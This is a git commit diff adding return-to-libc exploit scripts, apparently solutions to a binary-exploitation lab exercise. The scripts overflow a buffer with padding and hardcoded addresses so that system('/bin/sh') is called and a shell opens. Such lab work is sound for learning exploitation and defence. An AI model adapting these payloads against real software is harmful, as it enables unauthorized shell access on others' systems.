20fb392de1bd65adf112690c7e89ae4af6694093
a <a@b.com>
2017-09-20 15:59:25 -0400

    Both crashing and continuation examples

---
+++ ret2libc/solution_coe.py
@@ -0,0 +1,23 @@
+import sys
+# Make sure aslr is disabled, even though nothing seemed wrong in gdb
+# Why doesn't it work with gets?
+
+system_addr = "\xa0\xfd\xe2\xf7"
+exit_addr = "\xd0\x39\xe2\xf7"
+fake_retaddr = "DDDD"
+# In GDB
+sh_str_addr = "\xfc\xcb\xff\xff" # end of our entire string
+# Standalone
+sh_str_addr = "\x3c\xcc\xff\xff" # end of our entire string
+sh_str = "/bin/sh"
+
+exploit = "A"*0x40 # padding
+exploit += "BBBB" # overwrite ebp
+exploit += system_addr
+exploit += exit_addr # the 'junk' return addr for system
+exploit += sh_str_addr # BOTH arg to system call and junk ret addr for exit
+
+exploit += "\x40\x01\x01\x01" # this will be arg for exit call (can't have nulls?)
+exploit += sh_str
+print(exploit)
+
--- ret2libc/solution_crashes.py
+++ ret2libc/solution_crashes.py
@@ -1,12 +1,13 @@
 import sys
 # Make sure aslr is disabled, even though nothing seemed wrong in gdb
+# Why doesn't it work with gets?
 
 system_addr = "\xa0\xfd\xe2\xf7"
 fake_retaddr = "DDDD"
 # In GDB
 sh_str_addr = "\xf8\xcb\xff\xff" # end of our entire string
 # Standalone
-sh_str_addr = "\x38\xcc\xff\xff" # end of our entire string
+#sh_str_addr = "\x38\xcc\xff\xff" # end of our entire string
 sh_str = "/bin/sh"
 
 sys.stdout.write("A"*0x40 + "BBBB" + system_addr + fake_retaddr + sh_str_addr + sh_str)
